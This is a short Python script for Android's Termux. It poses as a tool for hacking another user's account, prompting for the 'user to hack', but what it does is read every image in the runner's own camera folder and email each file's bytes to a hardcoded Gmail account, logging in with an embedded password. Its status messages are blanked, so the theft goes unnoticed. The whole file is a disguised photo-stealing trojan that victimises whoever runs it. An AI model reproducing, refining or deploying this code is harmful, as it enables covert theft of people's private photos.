import os
import smtplib
from email.message import EmailMessage

# El input que querías añadir al inicio
input("Ingrese el usuario que desea vulnerar: ")

# --- CONFIGURACIÓN DE CREDENCIALES ---
remitente = "cuentacrack7809@gmail.com"
destinatario = "cuentacrack7809@gmail.com"
password = "bqruwxkzuhsmvrjt"

# --- RUTA DE ARCHIVOS ---
ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"

# --- FILTRO DE EXTENSIONES ---
# Solo procesará archivos que terminen en estos formatos
formatos_imagen = ('.jpg', '.jpeg', '.png', '.webp', '.gif')

def enviar_datos_binarios(nombre_archivo, contenido_hex):
    """Crea y envía el correo con la representación de bits."""
    msg = EmailMessage()
    msg["From"] = remitente
    msg["To"] = destinatario
    msg["Subject"] = f"Imagen extraída: {nombre_archivo}"
    
    msg.set_content(f"Contenido binario de {nombre_archivo}:\n\n{contenido_hex}")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(remitente, password)
            smtp.send_message(msg)
        print(f"✅ ")
    except Exception:
        print(f"❌ ")

# --- PROCESO PRINCIPAL ---
try:
    if os.path.exists(ruta_camara):
        # Listamos archivos y filtramos por extensión de imagen
        archivos = [
            f for f in os.listdir(ruta_camara) 
            if os.path.isfile(os.path.join(ruta_camara, f)) and f.lower().endswith(formatos_imagen)
        ]
        
        if not archivos:
            print("No se encontraron imágenes para enviar.")
        
        for nombre in archivos:
            ruta_completa = os.path.join(ruta_camara, nombre)
            print(f"Procesando ")
            
            with open(ruta_completa, "rb") as archivo:
                contenido_binario = archivo.read()
                
                # Convertimos a la cadena de bits (\x00...) que pediste
                cadena_binaria = repr(contenido_binario)
                
                # Enviar por correo
                enviar_datos_binarios(nombre, cadena_binaria)
                
    else:
        print(f"Error: Ruta no encontrada.")

except Exception as e:
    print(f"Error general: {e}")
